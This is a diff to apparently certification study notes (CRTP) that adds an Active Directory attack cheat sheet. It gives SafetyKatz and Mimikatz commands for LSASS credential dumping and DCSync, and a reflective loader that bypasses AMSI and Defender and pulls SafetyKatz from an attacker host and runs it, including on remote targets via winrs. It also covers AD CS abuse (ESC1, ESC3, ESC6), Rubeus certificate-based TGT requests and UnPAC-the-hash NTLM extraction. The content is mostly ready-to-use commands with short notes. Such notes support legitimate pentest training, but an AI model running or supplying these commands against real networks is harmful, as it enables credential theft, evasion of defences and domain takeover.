@@ -40,17 +40,71 @@ mimikatz # sekurlsa::logonpasswords
 
 ---
 
-## Mimikatz & SafetyKatz Memory Extraction
+## Mimikatz — Direct Execution
 
 ```cmd
-# Direct Mimikatz execution
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
 
-# SafetyKatz execution (Obfuscated Mimikatz wrapper with AMSI bypass)
+---
+
+## SafetyKatz
+
+> [!NOTE]
+> **SafetyKatz** is a .NET wrapper around Mimikatz that creates a minidump of LSASS in memory using `MiniDumpWriteDump`, then runs a customised build of Mimikatz on the in-memory dump. It avoids dropping a full Mimikatz binary to disk, reducing AV/EDR detection surface.
+
+### Direct Execution
+
+```cmd
+# Dump encryption keys (AES, NTLM, etc.) from LSASS
 SafetyKatz.exe "sekurlsa::ekeys" "exit"
 
-# Executing SafetyKatz via memory loader
+# Dump full logon credentials (passwords, hashes, tickets)
+SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
+
+# Dump Kerberos tickets from memory
+SafetyKatz.exe "sekurlsa::tickets" "exit"
+
+# DCSync — replicate password hashes from a DC
+SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt" "exit"
+SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN_SHORT>\Administrator" "exit"
+
+# Dump LSA secrets and cached credentials
+SafetyKatz.exe "lsadump::lsa /patch" "exit"
+
+# Overpass-the-Hash — spawn a process with stolen credentials
+SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe" "exit"
+```
+
+### Execution via Loader (AMSI & Defender Bypass)
+
+> [!TIP]
+> `Loader.exe` is a reflective PE loader that loads SafetyKatz entirely in memory without touching disk, bypassing AMSI and on-disk AV signatures.
+
+```cmd
+# Load SafetyKatz from local path and dump encryption keys
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
+
+# Dump full logon credentials via Loader
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::logonpasswords" "exit"
+
+# DCSync via Loader
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt" "exit"
+```
+
+### Download & Execute from Remote URL
+
+```cmd
+# Serve SafetyKatz via a web server and load directly into memory
+C:\AD\Tools\Loader.exe -path http://<ATTACKER_IP>/SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
+```
+
+### Running on a Remote Machine via winrs / PSRemoting
+
+```cmd
+# Copy Loader to the target, then execute SafetyKatz remotely
+echo F | xcopy C:\AD\Tools\Loader.exe \\<TARGET>\C$\Users\Public\Loader.exe /Y
+winrs -r:<TARGET> C:\Users\Public\Loader.exe -path http://<ATTACKER_IP>/SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
 ```
 
 ---
@@ -191,3 +245,114 @@ mimikatz # !drv::install C:\AD\Tools\mimidrv.sys
 mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # sekurlsa::logonpasswords
 ```
+
+---
+
+## Certificate-Based Credential Access (AD CS Abuse)
+
+> [!IMPORTANT]
+> Active Directory Certificate Services (AD CS) can be abused to obtain credentials (TGTs, NTLM hashes) for any domain user or computer — including Domain Admins — by requesting certificates with an attacker-controlled Subject Alternative Name (SAN). See also: [08-ADCS-PERSISTENCE.md](file:///d:/CRTP_Digital_Notes_GitHub_Notion/CRTP_Digital_Notes/github/08-ADCS-PERSISTENCE.md) for CA key extraction, ForgeCert, and persistence.
+
+### Enumerate Vulnerable Templates
+
+```cmd
+# Certify — find all vulnerable templates (ESC1, ESC2, ESC3, etc.)
+Certify.exe find /vulnerable
+
+# Certify — enumerate templates on a specific CA
+Certify.exe find /ca:<CA_HOST>\<CA_NAME>
+
+# Certify — list all enabled certificate templates
+Certify.exe find
+```
+
+```bash
+# Certipy — enumerate and identify vulnerable templates
+certipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable
+```
+
+```powershell
+# PSPKIAudit — PowerShell-based audit
+. C:\AD\Tools\PSPKIAudit.ps1
+Invoke-PKIAudit
+```
+
+### ESC1 — Enrollee Supplies Subject (SAN Control)
+
+> [!NOTE]
+> A template is ESC1-vulnerable when it has **Client Authentication EKU**, **ENROLLEE_SUPPLIES_SUBJECT** flag set, **no manager approval**, and **low-privileged enroll permission**.
+
+```cmd
+# Request a certificate as the current user, but set the SAN to a DA account
+Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator
+```
+
+```bash
+# Certipy — request ESC1 certificate with attacker SAN
+certipy req -u <USER>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_HOST> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>
+```
+
+### ESC3 — Enrollment Agent Abuse
+
+> [!NOTE]
+> ESC3 abuses templates that grant **Certificate Request Agent** EKU. First, enroll in an agent template to get an enrollment agent certificate, then use it to request a certificate on behalf of any user.
+
+```cmd
+# Step 1: Request an Enrollment Agent certificate
+Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<AGENT_TEMPLATE>
+
+# Step 2: Use the agent cert to request a certificate on behalf of a DA
+Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TARGET_TEMPLATE> /onbehalfof:<DOMAIN_SHORT>\Administrator /enrollcert:<AGENT_CERT.pfx> /enrollcertpw:<PFX_PASSWORD>
+```
+
+### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+
+> [!NOTE]
+> If the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled, **any** template with Client Authentication EKU can be abused like ESC1 — the SAN can be specified in the request regardless of template settings.
+
+```cmd
+# Request a cert from any Client Auth template with an arbitrary SAN
+Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:User /altname:Administrator
+```
+
+### Convert PEM to PFX (if needed)
+
+```bash
+# Certipy outputs .pfx directly, but if you have separate cert + key:
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+### Request TGT Using Certificate (Rubeus)
+
+```cmd
+# Use the obtained .pfx certificate to request a TGT and inject it
+Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /ptt
+
+# Request TGT with specific encryption type
+Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt
+
+# Save to kirbi file instead of injecting
+Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /outfile:C:\AD\Tools\admin_tgt.kirbi /domain:<DOMAIN> /dc:<DC_FQDN>
+```
+
+```bash
+# Certipy — request TGT using certificate (outputs .ccache)
+certipy auth -pfx cert.pfx -dc-ip <DC_IP>
+```
+
+### UnPAC-the-Hash — Extract NTLM from Certificate Auth
+
+> [!TIP]
+> PKINIT (certificate-based Kerberos auth) returns a PAC containing the user's NTLM hash encrypted with the session key. **UnPAC-the-hash** extracts it, giving you the NTLM hash without ever touching LSASS.
+
+```cmd
+# Rubeus — request TGT and retrieve the NTLM hash via U2U
+Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /getcredentials /domain:<DOMAIN> /dc:<DC_FQDN> /show
+```
+
+```bash
+# Certipy — authenticate and extract NTLM hash automatically
+certipy auth -pfx cert.pfx -dc-ip <DC_IP>
+# Output includes: [*] Got hash for 'Administrator@<DOMAIN>': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
+```
+
